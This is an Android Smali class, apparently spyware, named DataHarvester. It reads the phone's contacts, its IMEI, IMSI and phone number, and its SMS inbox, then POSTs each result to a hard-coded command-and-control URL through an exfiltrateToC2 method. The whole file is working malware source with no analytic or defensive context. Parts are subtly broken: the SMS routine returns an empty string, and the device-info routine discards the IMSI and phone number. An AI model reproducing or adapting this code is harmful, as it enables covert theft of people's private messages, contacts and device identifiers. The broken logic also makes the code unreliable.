.class public Lcom/malapp/DataHarvester;
.super Ljava/lang/Object;
.source "DataHarvester.java"

.field private c2Server:Ljava/lang/String;
.field private context:Landroid/content/Context;

.method public constructor <init>(Landroid/content/Context;)V
    .locals 1
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    iput-object p1, p0, Lcom/malapp/DataHarvester;->context:Landroid/content/Context;
    const-string v0, "https://c2.malapp-command.net/collect"
    iput-object v0, p0, Lcom/malapp/DataHarvester;->c2Server:Ljava/lang/String;
    return-void
.end method

.method public harvestContacts()Ljava/lang/String;
    .locals 5

    # Read contacts from device
    iget-object v0, p0, Lcom/malapp/DataHarvester;->context:Landroid/content/Context;
    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;
    move-result-object v0

    sget-object v1, Landroid/provider/ContactsContract$Contacts;->CONTENT_URI:Landroid/net/Uri;
    const/4 v2, 0x0
    invoke-virtual {v0, v1, v2, v2, v2, v2}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;
    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    :loop
    invoke-interface {v3}, Landroid/database/Cursor;->moveToNext()Z
    move-result v0
    if-eqz v0, :done
    const/4 v0, 0x0
    invoke-interface {v3, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
    move-result-object v0
    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v0, ","
    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    goto :loop
    :done

    invoke-interface {v3}, Landroid/database/Cursor;->close()V
    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v0
    return-object v0
.end method

.method public harvestDeviceInfo()Ljava/lang/String;
    .locals 4

    # Collect device identifiers
    iget-object v0, p0, Lcom/malapp/DataHarvester;->context:Landroid/content/Context;
    const-string v1, "phone"
    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
    move-result-object v0
    check-cast v0, Landroid/telephony/TelephonyManager;

    # Get IMEI
    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;
    move-result-object v1

    # Get IMSI
    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getSubscriberId()Ljava/lang/String;
    move-result-object v2

    # Get phone number
    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;
    move-result-object v3

    return-object v1
.end method

.method public harvestSmsMessages()Ljava/lang/String;
    .locals 5

    # Read SMS inbox
    iget-object v0, p0, Lcom/malapp/DataHarvester;->context:Landroid/content/Context;
    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;
    move-result-object v0

    const-string v1, "content://sms/inbox"
    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;
    move-result-object v1
    const/4 v2, 0x0
    invoke-virtual {v0, v1, v2, v2, v2, v2}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;
    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V
    return-object v4
.end method

.method public exfiltrateToC2(Ljava/lang/String;)V
    .locals 4
    .param p1, "stolen_data"

    # POST stolen data to command-and-control server
    new-instance v0, Ljava/net/URL;
    iget-object v1, p0, Lcom/malapp/DataHarvester;->c2Server:Ljava/lang/String;
    invoke-direct {v0, v1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
    invoke-virtual {v0}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;
    move-result-object v0
    check-cast v0, Ljava/net/HttpURLConnection;

    const-string v1, "POST"
    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    const/4 v1, 0x1
    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;
    move-result-object v1

    invoke-virtual {p1}, Ljava/lang/String;->getBytes()[B
    move-result-object v2
    invoke-virtual {v1, v2}, Ljava/io/OutputStream;->write([B)V
    invoke-virtual {v1}, Ljava/io/OutputStream;->close()V

    return-void
.end method

.method public run()V
    .locals 1

    # Harvest and exfiltrate all data
    invoke-virtual {p0}, Lcom/malapp/DataHarvester;->harvestContacts()Ljava/lang/String;
    move-result-object v0
    invoke-virtual {p0, v0}, Lcom/malapp/DataHarvester;->exfiltrateToC2(Ljava/lang/String;)V

    invoke-virtual {p0}, Lcom/malapp/DataHarvester;->harvestDeviceInfo()Ljava/lang/String;
    move-result-object v0
    invoke-virtual {p0, v0}, Lcom/malapp/DataHarvester;->exfiltrateToC2(Ljava/lang/String;)V

    invoke-virtual {p0}, Lcom/malapp/DataHarvester;->harvestSmsMessages()Ljava/lang/String;
    move-result-object v0
    invoke-virtual {p0, v0}, Lcom/malapp/DataHarvester;->exfiltrateToC2(Ljava/lang/String;)V

    return-void
.end method
